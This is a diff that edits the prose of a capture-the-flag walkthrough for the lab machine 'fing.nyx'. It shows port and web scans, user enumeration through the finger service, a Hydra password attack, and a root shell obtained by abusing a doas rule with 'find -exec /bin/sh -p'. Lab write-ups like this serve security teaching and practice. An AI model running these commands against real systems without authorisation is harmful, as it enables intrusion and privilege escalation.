@@ -14,9 +14,9 @@ The `finger` service — an old protocol for querying user info on a remote syst
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn fing.nyx
@@ -28,7 +28,7 @@ PORT   STATE SERVICE REASON
 MAC Address: 00:0C:29:CA:12:A8 (VMware)
 ```
 
-Three ports are found open: **22 (SSH)**, **79 (finger)**, and **80 (HTTP)**. `finger` in particular is worth noting — it's a legacy service, rarely seen exposed today, historically used to query information about users on a remote system. A version/script scan against all three fills in the details:
+Three ports come back open: **22 (SSH)**, **79 (finger)**, and **80 (HTTP)**. `finger` in particular is worth noting — it's a legacy service, rarely seen exposed today, historically used to query information about users on a remote system. A version/script scan against all three fills in the details:
 
 ```bash
 $ sudo nmap -p 22,79,80 -sCV fing.nyx
@@ -50,12 +50,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Web Enumeration
 
-The main page:
+The main page is just the stock Apache default, so there's little to work with here:
 
 ```
 http://fing.nyx
 ```
+
 <img src="../Images/fing/Pasted image 20260518175754.png"/>
+
+A directory scan confirms it, turning up nothing beyond the default index:
 
 ```bash
 $ gobuster dir -u 'http://fing.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
@@ -73,7 +76,7 @@ Finished
 
 ### Enumerating Users via `finger`
 
-Rather than the web app, `finger` itself is the more interesting service — it can be queried to check whether a given name corresponds to a real account. Metasploit's dedicated scanner automates trying a whole list of candidate names:
+With the web server a dead end, `finger` is the more interesting service — it can be queried to check whether a given name corresponds to a real account. Metasploit's dedicated scanner automates trying a whole list of candidate names:
 
 ```bash
 $ msfconsole -q
@@ -110,7 +113,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-18 17:43:
 ```bash
 $ ssh adam@fing.nyx
 adam@fing.nyx's password:
-Linux fing 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
 Last login: Sun Apr 23 13:21:44 2023 from 192.168.1.10
 adam@fing:~$ id
 uid=1000(adam) gid=1000(adam) groups=1000(adam)
@@ -127,6 +129,8 @@ ff18a9aca2d1dac41a5c26e6667bea9d
 
 ### Abusing `find` via `doas`
 
+A sweep for SUID binaries comes first, to see if anything obvious is already available:
+
 ```bash
 adam@fing:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 -rwsr-xr-x 1 root root 55528 Jan 20  2022 /usr/bin/mount
@@ -142,7 +146,7 @@ adam@fing:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 -rwsr-xr-- 1 root messagebus 51336 Oct  5 2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-Nothing obvious turns up among SUID binaries, so `doas` — a smaller, OpenBSD-originated alternative to `sudo`, also available on Linux — is checked next:
+Nothing exploitable stands out among the SUID binaries, but `doas` shows up in the list — a smaller, OpenBSD-originated alternative to `sudo`, also available on Linux — so its config is worth checking next:
 
 ```bash
 adam@fing:~$ ls -l /etc/doas.conf
@@ -151,7 +155,7 @@ adam@fing:~$ cat /etc/doas.conf
 permit nopass keepenv adam as root cmd /usr/bin/find
 ```
 
-`find`'s own `-exec` flag is a well-documented privilege escalation vector whenever it can be run as another user: since the spawned process inherits the privileges `find` itself is running with, `-exec /bin/sh -p` drops straight into a shell as that user instead of just running a single command:
+The rule lets `adam` run `find` as root with no password. `find`'s own `-exec` flag is a well-documented privilege escalation vector whenever it can be run as another user: since the spawned process inherits the privileges `find` itself is running with, `-exec /bin/sh -p` drops straight into a shell as that user instead of just running a single command:
 
 ```bash
 adam@fing:~$ doas -u root /usr/bin/find . -exec /bin/sh -p \; -quit
